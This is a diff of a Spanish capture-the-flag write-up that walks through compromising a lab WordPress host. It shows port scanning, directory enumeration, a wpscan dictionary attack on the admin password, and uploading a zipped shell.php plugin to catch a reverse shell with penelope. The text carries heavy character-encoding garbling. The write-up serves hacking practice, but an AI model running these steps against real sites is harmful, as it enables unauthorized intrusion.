@@ -12,8 +12,8 @@ Fecha: 2026-02-18
 Empezaremos con un reconocimiento de la superficie para que encontramos.
 
 ```bash
-¯é░ gomap -s $TARGET
-­ƒÄ» Scanning 192.168.1.100 (997 ports)
+é gomap -s $TARGET
+­ Scanning 192.168.1.100 (997 ports)
 
 PORT    STATE  SERVICE         VERSION
 80      open   http            Apache 2.4.58 (Ubuntu)
@@ -29,7 +29,7 @@ Como solo tiene un puerto abierto nos dirigimos a la web para ver que encontramo
 Solo hay un bot├│n con un error, pero esto es raro, as├¡ que procedemos a realizar una enumeraci├│n de directorios.
 
 ```bash
-¯é░ gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+é gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -59,7 +59,7 @@ Vemos que tenemos un **Wordpress** y un **PhpMyAdmin**, as├¡ que empezaremos 
 Pero nos redirige a un dominio as├¡ que lo indicaremos en */ect/hosts*.
 
 ```bash
-¯é░ sudo nano /etc/hosts
+é sudo nano /etc/hosts
 
 127.0.0.1       localhost
 127.0.1.1       jd-sec.intracof.local   jd-sec
@@ -75,7 +75,7 @@ ff02::2 ip6-allrouters
 Encontramos la web de un guitarrista y procedemos a la enumeraci├│n visual de la web y posteriormente desde *wpscan*.
 
 ```bash
-¯é░ wpscan --url http://escolares.dl/wordpress/ -e u,p
+é wpscan --url http://escolares.dl/wordpress/ -e u,p
 ```
 
 Visualmente no encontramos nada interesante, pero desde *wpscan encontramos*.
@@ -224,7 +224,7 @@ Buscamos informaci├│n para ver cual de los 2 puede ser mas interesante.
 Descubrimos que necesitamos al menos privilegios de autor o admin, as├¡ que vamos a probar a realizar un ataque de diccionario contra el usuario *admin* y encontrar su clave de acceso.
 
 ```bashh
-¯é░ wpscan --url http://escolares.dl/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
+é wpscan --url http://escolares.dl/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
 
 <skip>
 
@@ -257,17 +257,17 @@ License: GPL2
 ```
 
 ```bash
-¯é░ nano shell.php
+é nano shell.php
 
-¯é░ 7z a ./shell.zip ./shell.php
+é 7z a ./shell.zip ./shell.php
 ```
 
 Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* para despu├®s subir el plugin y al activarlo conseguir un reversehell.
 
 ```bash
-¯é░ penelope -p 443
+é penelope -p 443
 [+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.11 ÔÇó 172.17.0.1 ÔÇó 192.168.1.1
-Ô×ñ  ­ƒÅá Main Menu (m) ­ƒÆÇ Payloads (p) ­ƒöä Clear (Ctrl-L) ­ƒÜ½ Quit (q/Ctrl-C)
+Ô×ñ  ­Åá Main Menu (m) ­ÆÇ Payloads (p) ­ö Clear (Ctrl-L) ­Ü½ Quit (q/Ctrl-C)
 ```
 
 <img width="1503" height="719" alt="Pasted image 20260218091957" src="https://github.com/user-attachments/assets/e77c5e9c-4139-4134-a44c-04d2c5f29edd" />
@@ -275,11 +275,11 @@ Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* pa
 Una vez activo el plugin obtendremos una revershell y estaremos dentro del servidor.
 
 ```bash
-[+] Got reverse shell from 07ea20f65d0d~192.168.1.100-Linux-x86_64 ­ƒÿì´©Å Assigned SessionID <1>
+[+] Got reverse shell from 07ea20f65d0d~192.168.1.100-Linux-x86_64 ­ÿì´©Å Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
-[+] Shell upgraded successfully using /usr/bin/python3! ­ƒÆ¬
+[+] Shell upgraded successfully using /usr/bin/python3! ­Æ¬
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/jduran/.penelope/sessions/07ea20f65d0d~192.168.1.100-Linux-x86_64/2026_02_18-09_40_47-986.log ­ƒô£
+[+] Logging to /home/jduran/.penelope/sessions/07ea20f65d0d~192.168.1.100-Linux-x86_64/2026_02_18-09_40_47-986.log ­ô£
 ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
 www-data@07ea20f65d0d:/$ whoami
 www-data
@@ -350,3 +350,4 @@ Esta contrase├▒a seguramente sea del usuario *ubuntu* o del *root* pero como
 ---
 Si te gusto puedes invitarme a un cafe.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
+
